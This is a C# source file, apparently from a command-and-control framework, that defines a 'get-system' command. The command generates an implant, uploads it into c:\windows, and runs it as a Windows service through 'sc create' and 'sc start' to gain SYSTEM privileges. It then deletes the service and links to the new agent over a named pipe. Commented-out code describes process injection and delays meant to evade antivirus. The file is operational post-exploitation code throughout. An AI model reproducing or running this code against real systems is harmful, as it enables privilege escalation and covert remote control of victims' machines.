using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Common.AgentCommands;
using Common.AgentCommands.Composite;
using Common.AgentCommands.Custom;
using Common.CommandLine.Core;
using Common.Payload;
using Shared;

namespace Common.Command.Custom
{
    public class GetSystemCommandOptions : CommandOption
    {
        //[Option("b", "endpoint", "EndPoint to Bind To")]
        //public string endpoint { get; set; }

        [Option("v", "verbose", "Show details of the command execution.")]
        public bool verbose { get; set; }

        [Option("n", "pipe", "Name of the pipe used to pivot.", DefaultValue = "localsys")]
        public string pipe { get; set; }

        [Option("f", "file", "Name of payload.")]
        public string file { get; set; }

        [Option("p", "path", "Name of the folder to upload the payload.", DefaultValue = "c:\\windows")]
        public string path { get; set; }

        [Option("s", "service", "Name of service.", DefaultValue = "syssvc")]
        public string service { get; set; }

        /*[Option("-i", "--inject", "If the payload should be an injector")]
        public bool inject { get; set; }

        [Option("-id", "--injectDelay", "Delay before injection (AV evasion)", 30)]
        public int injectDelay { get; set; }

        [Option("-ip", "--injectProcess", "Process path used for injection", null)]
        public string injectProcess { get; set; }*/

        [Option("-x86", "--x86", "Generate a x86 architecture executable")]
        public bool x86 { get; set; }
    }

    [Command("get-system", "Obtain system agent using Services", Category = AgentCommandCategories.Composite)]
    public class GetSystemCommand : AgentCompositeCommand<GetSystemCommandOptions>
    {

        protected override async Task<bool> Run(AgentCommandContext context, GetSystemCommandOptions options)
        {
            if (context.Metadata.Integrity != Shared.IntegrityLevel.High)
            {
                context.WriteError($"[X] Agent should be in High integrity context!");
                return false;
            }

            var endpoint = ConnexionUrl.FromString($"pipe://*:{options.pipe}");

            var payloadOptions = new ImplantConfig()
            {
                StoreImplant = false,
                Architecture =  context.Metadata.Architecture == "x86" ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = false,
                IsVerbose = options.verbose,
                Type = ImplantType.Service,
                //InjectionDelay = options.injectDelay,
                //IsInjected = options.inject,
                //InjectionProcess = options.injectProcess
            };

            /*if (!string.IsNullOrEmpty(options.injectProcess))
                payloadOptions.InjectionProcess = options.injectProcess;*/

            context.WriteInfo($"[>] Generating Implant!");
            var implant = await context.GeneratePayload(payloadOptions);
            if (implant == null)
                context.WriteError($"[X] Generation Failed!");
            else
                context.WriteSuccess($"[+] Generation succeed!");

            context.WriteInfo($"[>] Preparing Agent command flow...");

            var fileName = string.IsNullOrEmpty(options.file) ? implant.Config.ImplantName + ".exe" : options.file;
            if (Path.GetExtension(fileName).ToLower() != ".exe")
                fileName += ".exe";

            string path = options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;
            context.Echo($"[>] Saving implant to {path}");
            context.Upload(Convert.FromBase64String(implant.Data), path);
            context.Delay(1);

            context.Echo($"[>] Creating service");
            context.Shell($"sc create {options.service} binPath= \"{path}\"");
            context.Echo($"[>] Starting service");
            context.Shell($"sc start {options.service}");

            context.Delay(20);
            
            /*if (!options.inject)
            {*/
            context.Echo($"[>] Removing service");
            context.Shell($"sc delete {options.service}");
            context.Echo($"[!] Don't forget to remove service binary after use! : del {path}");
            /*}
            else
            {
                agent.Echo($"Waiting {options.injectDelay + 10}s to evade antivirus");
                agent.Delay(options.injectDelay + 10);
                agent.Echo($"Removing service");
                agent.Shell($"sc delete {options.service}");
                agent.Echo($"Removing injector {path}");
                agent.DeleteFile(path);
            }*/

            

            //if (endpoint.Protocol == ConnexionType.NamedPipe)
            //{
                context.Echo($"[>] Linking to pipe://127.0.0.1:{options.pipe}");
                var targetEndPoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{options.pipe}");
                context.Link(targetEndPoint);
            //}

            //if (options.inject)
            //    commander.WriteInfo($"Due to AV evasion, agent can take a couple of minutes to check-in...");

            context.Echo($"[*] Execution done!");
            context.Echo(Environment.NewLine);

            return true;
        }
    }
}
